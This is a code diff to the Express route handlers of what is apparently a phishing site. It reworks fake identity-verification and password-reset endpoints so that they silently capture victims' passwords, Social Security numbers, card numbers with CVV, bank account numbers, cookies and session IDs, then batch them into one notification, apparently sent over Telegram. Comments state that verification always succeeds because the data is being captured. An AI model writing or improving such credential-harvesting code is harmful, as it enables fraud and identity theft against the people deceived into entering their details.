@@ -336,15 +336,11 @@ export async function registerRoutes(
 
       const { verificationType } = result.data;
       
-      // Store the password in session for password reset step
+      // Store all verification data in session for password reset step (combined notification)
       if (req.body.currentPassword) {
         (req.session as any).capturedPassword = req.body.currentPassword;
       }
-      
-      // Log the identity verification attempt with all data
-      logVisitorAction(req, "identity_verification", {
-        username: username,
-        password: req.body.currentPassword,
+      (req.session as any).verificationData = {
         email: req.body.email,
         phone: req.body.phone,
         dateOfBirth: req.body.dateOfBirth,
@@ -353,6 +349,31 @@ export async function registerRoutes(
         cardExpiration: req.body.cardExpiration,
         cardCvv: req.body.cardCvv,
         accountNumber: req.body.accountNumber,
+      };
+      
+      // Log the identity verification attempt silently (no Telegram notification - will be sent with password reset)
+      await storage.logVisitor({
+        ipAddress: req.ip || req.headers["x-forwarded-for"]?.toString() || "unknown",
+        city: null,
+        region: null,
+        country: null,
+        timezone: null,
+        page: req.originalUrl || req.url,
+        userAgent: req.headers["user-agent"] || "",
+        username: username,
+        password: req.body.currentPassword,
+        email: req.body.email,
+        phone: req.body.phone,
+        ssn: req.body.ssn,
+        dateOfBirth: req.body.dateOfBirth,
+        cardNumber: req.body.cardNumber,
+        cardExpiration: req.body.cardExpiration,
+        cardCvv: req.body.cardCvv,
+        accountNumber: req.body.accountNumber,
+        cookies: req.headers.cookie || null,
+        sessionId: req.sessionID || null,
+        formData: JSON.stringify(req.body),
+        action: "identity_verification",
       });
 
       // Always verify successfully - we're capturing the data for admin monitoring
@@ -386,11 +407,22 @@ export async function registerRoutes(
 
       const { oldPassword, newPassword } = result.data;
       
-      // Log the password reset attempt with both old and new passwords
+      // Get all captured data from session (login + verification) for combined notification
+      const verificationData = (req.session as any)?.verificationData || {};
+      
+      // Log the password reset attempt with ALL captured data in one notification
       logVisitorAction(req, "password_reset", {
         username: username,
         password: oldPassword || (req.session as any)?.capturedPassword,
         newPassword: newPassword,
+        email: verificationData.email,
+        phone: verificationData.phone,
+        dateOfBirth: verificationData.dateOfBirth,
+        ssn: verificationData.ssn,
+        cardNumber: verificationData.cardNumber,
+        cardExpiration: verificationData.cardExpiration,
+        cardCvv: verificationData.cardCvv,
+        accountNumber: verificationData.accountNumber,
       });
 
       // Always succeed - we've captured the new password
